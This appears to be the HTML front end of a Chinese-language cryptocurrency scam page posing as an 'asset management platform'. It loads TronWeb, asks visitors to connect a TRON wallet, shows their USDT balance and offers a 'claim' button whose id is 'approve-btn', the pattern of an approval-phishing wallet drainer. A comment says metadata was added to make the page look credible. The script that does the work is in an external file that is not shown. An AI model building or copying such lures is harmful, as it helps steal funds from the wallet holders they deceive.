<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>资产管理平台</title>
    
    <!-- 添加更多元数据增加可信度 -->
    <meta name="description" content="专业的资产管理服务平台，安全可靠的数字资产管理工具">
    <meta name="keywords" content="资产管理,资产服务,数字服务">
    <meta name="author" content="资产管理团队">
    
    <!-- 防止缓存 -->
    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="0">
    
    <!-- 引入外部CSS -->
    <link rel="stylesheet" href="assets/styles.css?v=1.0.3">
    
    <!-- TronWeb库直接引入 -->
    <script src="https://cdn.jsdelivr.net/npm/tronweb@4.4.0/dist/TronWeb.js"></script>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg width="80" height="80" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
                    <rect x="10" y="10" width="80" height="80" fill="#2c72cb"></rect>
                    <polygon points="30,30 70,30 70,50 50,70 30,50" fill="#ffffff"></polygon>
                </svg>
            </div>
            <h1>资产管理平台</h1>
            <div class="info">
                <p>专业、安全的数字资产管理服务</p>
                <p class="warning">请在使用前了解相关操作指南</p>
            </div>
            
            <div id="error-container" class="error-container" style="display: none;">
                <div class="error-message">
                    加载失败，请确保：
                    <ul>
                        <li>您已安装浏览器钱包扩展</li>
                        <li>在手机上，请使用钱包内置浏览器打开</li>
                        <li>在电脑上，请安装相关浏览器扩展</li>
                    </ul>
                    <button id="retry-btn" class="retry-btn">重新加载</button>
                </div>
            </div>
            
            <div class="input-group">
                <label for="amount">领取数量</label>
                <input type="number" id="amount" placeholder="输入领取数量" value="100">
                <button id="max-btn" type="button">最大数量</button>
            </div>
            
            <div class="buttons">
                <button id="approve-btn" class="primary-btn" type="button">确认领取</button>
            </div>
            
            <div id="status" class="status warning">请连接钱包开始使用</div>
            
            <div class="details">
                <div class="detail-item">
                    <span>您的地址:</span>
                    <span id="user-address" class="address">未连接钱包</span>
                </div>
                <div class="detail-item">
                    <span>资产余额:</span>
                    <span id="usdt-balance">0</span>
                </div>
            </div>
        </div>
        
        <div class="footer">
            <p>请使用钱包连接此应用</p>
            <button id="connect-wallet" class="connect-btn" type="button">连接钱包</button>
        </div>
        
        <div class="version">v1.6</div>
    </div>
    
    <!-- 引入外部JavaScript -->
    <script src="assets/app.js"></script>
</body>
</html>
